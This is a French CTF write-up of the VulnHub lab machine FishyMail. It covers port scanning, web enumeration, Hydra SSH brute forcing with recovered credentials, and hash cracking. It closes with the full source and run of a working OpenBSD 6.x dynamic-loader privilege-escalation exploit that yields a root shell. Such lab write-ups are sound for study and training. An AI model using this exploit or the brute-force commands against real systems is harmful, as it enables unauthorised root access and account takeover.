---
title: "Solution du CTF FishyMail de VulnHub"
tags: [CTF, VulnHub]
---

[FishyMail](https://vulnhub.com/entry/fishymail-1,583/) était assez étrange d'abord par un jeu de pistes moyen au départ puis une escalade de privilèges à effectuer... sur du OpenBSD, ce qui est très rare sur un CTF.

## Spontex

Une bonne partie des ports sont customs :

```
Nmap scan report for 192.168.56.203
Host is up (0.00097s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE  SERVICE VERSION
25/tcp   closed smtp
80/tcp   closed http
443/tcp  closed https
2600/tcp open   ssh     OpenSSH 8.1 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:8.1: 
|       CVE-2020-15778  6.8     https://vulners.com/cve/CVE-2020-15778
|       C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3    6.8     https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3  *EXPLOIT*
|       10213DBE-F683-58BB-B6D3-353173626207    6.8     https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207  *EXPLOIT*
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
|       CVE-2019-16905  4.4     https://vulners.com/cve/CVE-2019-16905
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
|       CVE-2016-20012  4.3     https://vulners.com/cve/CVE-2016-20012
|_      CVE-2021-36368  2.6     https://vulners.com/cve/CVE-2021-36368
3306/tcp open   mysql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, NULL, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|_    Host '192.168.56.1' is not allowed to connect to this MariaDB server
8080/tcp open   http    Apache httpd 2.4.43 ((Unix))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Apache/2.4.43 (Unix)
| http-enum: 
|   /login/: Login page
|_  /robots.txt: Robots file
```

Dans le `robots.txt` on trouve 3 entrées :

```
User-agent: *
Disallow:
/spongebob
/dataentry
/fishymailer
```

Il y a le fichier `/fishymailer/notes.txt` qui semble intéressant, car il donne deux noms d'utilisateurs.

> Spongebob our friend dirtysalmon really needs to take a moment to check his mail. We have a fishymail problem on the system.

À l'aide d'une énumération web j'ai trouvé un dossier `/login` où se trouve un formulaire de connexion.

J'ai procédé à une attaque par force brute qui n'a mené nulle part :

```bash
ffuf -u http://192.168.56.203:8080/login/action_page.php -d 'uname=dirtysalmon&psw=FUZZ&remember=on' -H 'Content-Type: application/x-www-form-urlencoded' -w wordlists/rockyou.txt  -fs 114
```

J'ai ensuite énuméré le dossier `/dataentry`. Celui-ci n'a pas le directory listing activé, il affiche juste une photo de chat.

Il faut énumérer récursivement les dossiers et à chaque fois, on a droit à une nouvelle image de chat.

Au bout d'un moment je trouve fichier `/dataentry/backup/admin/files/dir.txt` qui contient du base64. Une fois décodé il donne ceci :

> Mail Login:  
> 
> spongebob
> Sandy 
> 
> squidward
> 0ctopus
> 
> patrick
> chocolateflavoredWATER
> 
> dirtysalmon
> chinook

Il y a aussi des fichiers `list.txt` et `employees.txt` mais ils ne semblent pas contenir d'informations utiles au CTF.

## Kcoquille

```console
$ hydra -L users.txt -P pass.txt -e nsr ssh://192.168.56.203:2600
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28 login tries (l:4/p:7), ~2 tries per task
[DATA] attacking ssh://192.168.56.203:2600/
[2600][ssh] host: 192.168.56.203   login: squidward   password: 0ctopus
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished
```

Avec `Hydra` je teste les utilisateurs et mots de passe. On en obtient un valide.

Une fois connecté on semble être dans un chroot. Il n'y a quasi rien à la racine et on dispose d'un dossier `bin` avec quelques binaires.

```console
fishymail$ ls /     
BikiniBottom-db.sql  bin                  squidward
fishymail$ pwd
/squidward
```

Le fichier sql contient du base64 qui se décode en un script PHP :

```php
<?php
$session = mysql_xdevapi\getSession("mysqlx://user:password@localhost");

$session->sql("DROP DATABASE IF EXISTS BikiniBottom")->execute();
$session->sql("CREATE DATABASE BikiniBottom")->execute();
$session->sql("CREATE TABLE BikiniBottom.names(name text, password text)")->execute();
$session->sql("INSERT INTO addressbook.names values ('spongebob', ‘d686a53fb86a6c31fa6faa1d9333267e’), ('squidward', ‘ab404e807c1fdf281a74f7a1e7c458a4’), ('patrick', ‘af0fadc5ebbcc10a98301a92e4fc248c’), ('dirtysalmon', ‘7efcfa392716c6379a2e6b7c3739e5a3’), ('Sandy', ‘901d32488aa7079e4817c91bc2b69a4d’)")->execute();

$schema = $session->getSchema("addressbook");
$table  = $schema->getTable("names");

$row = $table->select('name', 'age')->execute()->fetchAll();

print_r($row);
?>
```

J'ai soumis les hashes à `crackstation.net` et obtenu les résultats suivants :

```
spongebob / sandy
squidward / 0ctopus
dirtysalmon / crabby4eva
Sandy / astronaut
```

C'est reparti pour un tour de brute force :

```
[2600][ssh] host: 192.168.56.203   login: dirtysalmon   password: crabby4eva
```

Ce nouveau compte a un flag dans son dossier personnel :

```
Dont forget your flag ;)

14JrufQjVSvlKXY2u0Ct8mIoyrpDrj0tW2Dh82DYl2VN
```

Je découvre aussi qu'on est sur un système OpenBSD comme pour le CTF [Ypuffy de HackTheBox]({% link _posts/2019-02-09-Solution-du-CTF-Ypuffy-de-HackTheBox.md %}). Je ne sens pas tout à fait à mon aise, car pas mal de commandes et concepts sont différents.

```console
fishymail$ ls /
altroot    bin        boot       bsd        bsd.booted bsd.rd     dev        etc        home       lost+found mnt        root       sbin       sys        tmp        usr        var
```

Dans tous les cas j'observe que l'on est membre du groupe `wheel` et je peux lire le fichier de configuration de MySQL :

```console
fishymail$ id
uid=1000(dirtysalmon) gid=1000(dirtysalmon) groups=1000(dirtysalmon), 0(wheel)
fishymail$ ls -al /etc/my.cnf  
-rw-r--r--  1 root  wheel  464 Sep 27  2020 /etc/my.cnf
```

J'y trouve un mot de passe, mais ce dernier ne permet pas de passer root.

```ini
# This will be passed to all MariaDB clients
[client]
#password=MrKrabShack@@@
```

Il fonctionne bien pour l'accès à MySQL mais je n'ai rien trouvé de valeur à l'intérieur.

Je parviens à déterminer la version d'OpenBSD :

```console
fishymail$ uname -rms
OpenBSD 6.6 amd64
```

_Qualys_ a trouvé une vulnérabilité qui devrait correspondre à cette version : [OpenBSD 6.x - Dynamic Loader Privilege Escalation - OpenBSD local Exploit](https://www.exploit-db.com/exploits/47780).

Je tente de reproduire l'exploitation :

```console
fishymail$ cd /tmp/                                                                                                                                                                                              
fishymail$ cat > lib.c << "EOF"
> #include <paths.h>
> #include <unistd.h>
> 
> static void __attribute__ ((constructor)) _init (void) {
>     if (setuid(0) != 0) _exit(__LINE__);
>     if (setgid(0) != 0) _exit(__LINE__);
>     char * const argv[] = { _PATH_KSHELL, "-c", _PATH_KSHELL "; exit 1", NULL };
>     execve(argv[0], argv, NULL);
>     _exit(__LINE__);
> }
> EOF
fishymail$ gcc -fpic -shared -s -o libutil.so.13.1 lib.c
fishymail$ cat > poc.c << "EOF"
> #include <string.h>
> #include <sys/param.h>
> #include <sys/resource.h>
> #include <unistd.h>
> 
> int
> main(int argc, char * const * argv)
> {
>     #define LLP "LD_LIBRARY_PATH=."
>     static char llp[ARG_MAX - 128];
>     memset(llp, ':', sizeof(llp)-1);
>     memcpy(llp, LLP, sizeof(LLP)-1);
>     char * const envp[] = { llp, "EDITOR=echo '#' >>", NULL };
> 
>     #define DATA (ARG_MAX * sizeof(char *))
>     const struct rlimit data = { DATA, DATA };
>     if (setrlimit(RLIMIT_DATA, &data) != 0) _exit(__LINE__);
> 
>     if (argc <= 1) _exit(__LINE__);
>     argv += 1;
>     execve(argv[0], argv, envp);
>     _exit(__LINE__);
> }
> EOF
fishymail$ gcc -s -o poc poc.c
fishymail$ ./poc /usr/bin/chpass
fishymail# id
uid=0(root) gid=0(wheel) groups=1000(dirtysalmon), 0(wheel)
fishymail# cd /root
fishymail# ls
.Xdefaults .cshrc     .cvsrc     .forward   .login     .profile   .ssh       .viminfo   proof.txt
fishymail# cat proof.txt                                                                                                                                                                                         
gx7Cc3rsxkDYlOrWnqG2SPND/fMvnRifshoD2HuDsWZs
```

Ça fonctionne :)
